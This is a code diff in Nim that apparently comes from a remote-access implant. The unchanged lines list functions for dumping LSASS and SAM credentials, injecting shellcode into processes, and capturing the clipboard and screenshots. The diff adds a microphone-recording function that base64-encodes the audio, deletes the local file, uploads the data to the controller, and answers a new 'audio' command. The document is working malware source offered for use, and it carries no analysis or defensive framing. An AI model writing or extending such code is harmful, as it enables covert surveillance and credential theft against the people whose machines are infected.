@@ -25,6 +25,7 @@ proc write_file(file_data_base64: string, file_path: string): bool
 proc checksec(): bool
 proc wrap_get_clipboard(): bool
 proc wrap_get_screenshot(): bool
+proc wrap_record_audio(record_time: int): bool
 proc dump_lsass(dump_method: string): bool
 proc dump_sam(): bool
 proc wrap_inject_shellc(shellc_base64: string, pid: int): bool
@@ -262,6 +263,36 @@ proc wrap_get_screenshot(): bool =
     }.toOrderedTable()
     
     is_success = post_data("screenshot" , $data)
+
+    return is_success
+
+
+proc wrap_record_audio(record_time: int): bool = 
+    var is_success: bool
+    var file_content_base64: string
+    var wav_file = "r.w"
+
+    discard record_audio(wav_file, record_time)
+
+    sleep(3000)
+
+    try:
+        file_content_base64 = encode_64(readFile(wav_file), is_bin=true)
+        is_success = true
+    except:
+        file_content_base64 = could_not_retrieve
+        is_success = false
+
+    try:
+        removeFile(wav_file)
+    except:
+        discard
+    
+    var data = {
+        "is_success": $is_success,
+        "file_content_base64": file_content_base64
+    }.toOrderedTable
+    is_success = post_data("audio" , $data)
 
     return is_success
 
@@ -613,6 +644,8 @@ proc parse_command(command: JsonNode): bool =
             is_success = wrap_get_clipboard()
         of "screenshot":
             is_success = wrap_get_screenshot()
+        of "audio":
+            is_success = wrap_record_audio(command["record_time"].getInt())
         of "lsass":
             is_success = dump_lsass(command["dump_method"].getStr())
         of "sam":
